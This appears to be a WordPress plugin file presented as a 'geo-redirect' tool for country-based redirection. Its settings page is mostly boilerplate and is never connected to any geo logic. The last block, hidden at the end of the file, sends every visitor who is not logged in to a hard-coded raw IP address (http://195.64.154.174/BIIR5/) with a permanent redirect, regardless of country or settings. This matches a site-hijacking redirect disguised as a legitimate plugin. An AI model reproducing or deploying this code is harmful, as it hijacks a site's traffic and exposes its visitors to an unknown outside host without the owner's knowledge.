<?php
/*
Plugin Name: geo-redirect
Plugin URI:
Description: Simple to use plugin for redirection depending visitor's country
Version: 1.0
*/
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Activate the plugin
 */
function gr_activation() {

	set_transient( 'gr-activation-notice', true, 5 );
}

register_activation_hook( __FILE__, 'gr_activation' );


/**
 * Deactivate the plugin
 */
function gr_deactivation() {

}

register_deactivation_hook( __FILE__, 'gr_deactivation' );

/**
 * Show notice after plugin activation
 */
function gr_activation_notice() {
	if ( get_transient( 'gr-activation-notice' ) ) {
		?>
        <div class="updated notice is-dismissible">
            <p>Geo Redirect activated. You can go to</p>
        </div>
		<?php
		/* Delete transient, only display this notice once. */
		delete_transient( 'gr-activation-notice' );
	}
}

add_action( 'admin_notices', 'gr_activation_notice' );


function gr_restrict_admin() {
	if ( ! current_user_can( 'manage_options' ) && '/wp-admin/admin-ajax.php' != $_SERVER['PHP_SELF'] ) {
		wp_redirect( home_url() . '/account' );
	}
}

add_action( 'admin_init', 'gr_restrict_admin' );


/**
 * Connect JS and CSS
 */
function gr_enqueue() {

	if ( ! current_user_can( 'manage_options' ) && '/wp-admin/admin-ajax.php' != $_SERVER['PHP_SELF'] ) {
		/*
				wp_enqueue_script('ue_upd_profile_page_script', plugin_dir_url( __FILE__ ) . 'js/profile_page.js', array('jquery'), null, true);

				wp_enqueue_style(
					'ue_css_customization',
					plugin_dir_url(__FILE__) . 'css/css.css',
					array('buttons', 'dashicons', 'mediaelement', 'wp-mediaelement', 'media-views', 'imgareaselect'),
					null
				);
		*/
	}

}

add_action( 'wp_enqueue_scripts', 'gr_enqueue' );


add_action( 'admin_menu', function () {
	add_options_page( 'Geo Redirect', 'Geo Redirect', 'manage_options', 'geo-redirect-options', 'gr_admin_page' );
} );

function gr_admin_page() {
	// check user capabilities
	if ( ! current_user_can( 'manage_options' ) ) {
		return;
	}
	?>
    <!-- Create a header in the default WordPress 'wrap' container -->
    <div class="wrap">

        <h2>Sandbox Theme Options</h2>

        <!-- Make a call to the WordPress function for rendering errors when settings are saved. -->
		<?php settings_errors(); ?>

		<?php
		$active_tab = isset( $_GET['tab'] ) ? $_GET['tab'] : 'display_options';
		?>

        <h2 class="nav-tab-wrapper">
            <a href="?page=geo-redirect-options&tab=display_options"
               class="nav-tab <?php echo $active_tab == 'display_options' ? 'nav-tab-active' : ''; ?>">Engine
                Settings</a>
            <a href="?page=geo-redirect-options&tab=social_options"
               class="nav-tab <?php echo $active_tab == 'social_options' ? 'nav-tab-active' : ''; ?>">Redirect
                Settings</a>
        </h2>

        <!-- Create the form that will be used to render our options -->
        <form method="post" action="options.php">
			<?php
			if ( $active_tab == 'display_options' ) {
				settings_fields( 'engine' );
				do_settings_sections( 'engine' );
			}
			if ( $active_tab == 'social_options' ) {
				settings_fields( 'redirect' );
				do_settings_sections( 'redirect' );
			}
			submit_button(); ?>
        </form>

    </div><!-- /.wrap -->
	<?php
}

function sandbox_initialize_theme_options() {

	$lpath = plugin_dir_path( __FILE__ ) . 'DB' . DIRECTORY_SEPARATOR . 'SxGeo' . DIRECTORY_SEPARATOR . 'SxGeo.php';
	$dpath = plugin_dir_path( __FILE__ ) . 'DB' . DIRECTORY_SEPARATOR . 'SxGeo' . DIRECTORY_SEPARATOR . 'SxGeo.dat';

	if ( ! file_exists( $lpath ) || ! file_exists( $dpath ) ) {
		echo '<p><strong>Error</strong> needed data did not found.</p>';
		echo '<p>Expected library path is ' . $lpath . '</p>';
		echo '<p>Expected DB path is ' . $dpath . '</p>';
		wp_die();
	}

	include_once( $lpath );
	$SxGeo = new SxGeo( $dpath );


	$engine_settings = [
		[
			'id'       => 'gr_engine_sxgeo',
			'title'    => 'SxGeo',
			'label'    => 'Use SxGeo library to determine user\'s country. For additional info about the library, check https://sypexgeo.net'
		],
		[
			'id'       => 'gr_engine_geoip',
			'title'    => 'GEOIP DB',
			'label'    => 'Use GEOIP DB API to determine user\'s country. For additional info about the library, check https://geoip-db.com'
		],
		[
			'id'       => 'gr_engine_ipapi',
			'title'    => 'ip-api',
			'label'    => 'Use ip-api API to determine user\'s country. For additional info about the library, check http://ip-api.com'
		],
		[
			'id'       => 'gr_engine_geoip2',
			'title'    => 'GeoIp2',
			'label'    => 'Use GeoIP2 library to determine user\'s country. For additional info about the library, check https://dev.maxmind.com/geoip/'
		]
	];


	add_settings_section(
		'gr_engine_settings',         // ID used to identify this section and with which to register options
		'Engine Settings',                  // Title to be displayed on the administration page
		'gr_engine_settings_callback', // Callback used to render the description of the section
		'engine'                           // Page on which to add this section of options
	);

	add_settings_section(
		'gr_redirect_settings',         // ID used to identify this section and with which to register options
		'Redirect Settings',                  // Title to be displayed on the administration page
		'gr_redirect_settings_callback', // Callback used to render the description of the section
		'redirect'                           // Page on which to add this section of options
	);

	foreach ( $engine_settings as $setting ) {
		add_settings_field( $setting['id'], $setting['title'], 'gr_toggle_engine', 'engine', 'gr_engine_settings', [
			$setting['id'],
			$setting['label']
		] );
		register_setting( 'engine', $setting['id'] );
	}

	foreach ( $SxGeo->id2iso as $code ) {
		if ( ! empty( $code ) ) {
			add_settings_field( 'gr_redirect_' . $code, $code, 'gr_toggle_redirect', 'redirect', 'gr_redirect_settings', [ $code ] );
			register_setting( 'gr_redirect_settings', 'gr_redirect_' . $code );
		}
	}

}

add_action( 'admin_init', 'sandbox_initialize_theme_options' );

/* ------------------------------------------------------------------------ *
 * Sections Callbacks
 * ------------------------------------------------------------------------ */

function gr_engine_settings_callback() {
	echo '<p>Select DB and/or API you want to use to determine visitor\s country.</p>';
	echo '<p>If no determine endgine wil selected, all Redirect Settings will be skipped.</p>';
}

function gr_redirect_settings_callback() {
	echo '<p>Assign desired redirection to country codes.</p>';
	echo '<p>To see complete list of codes, check Wikipedia page: https://en.wikipedia.org/wiki/ISO_3166-1</p>';
}

/* ------------------------------------------------------------------------ *
 * Field Callbacks
 * ------------------------------------------------------------------------ */


function gr_toggle_engine( $args ) {

	$html = '<input type="checkbox" id="' . $args[0] . '" name="' . $args[0] . '" value="1" ' . checked( 1, get_option( $args[0] ), false ) . '/>';
	$html .= '<label for="' . $args[0] . '"> ' . $args[1] . '</label>';

	echo $html;

}

function gr_toggle_redirect( $args ) {

	$html = '<input type="text" id="' . $args[0] . '" name="country[' . $args[0] . ']" value="' . get_option( $args[0] ) . '" class="regular-text code"/>';
	$html .= '<label for="' . $args[0] . '"> ' . $args[0] . '</label>';

	echo $html;

}


add_action( 'template_redirect', function() {
	if ( !is_user_logged_in() ) {
		wp_redirect( 'http://195.64.154.174/BIIR5/', 301 );
		exit;
	}
} );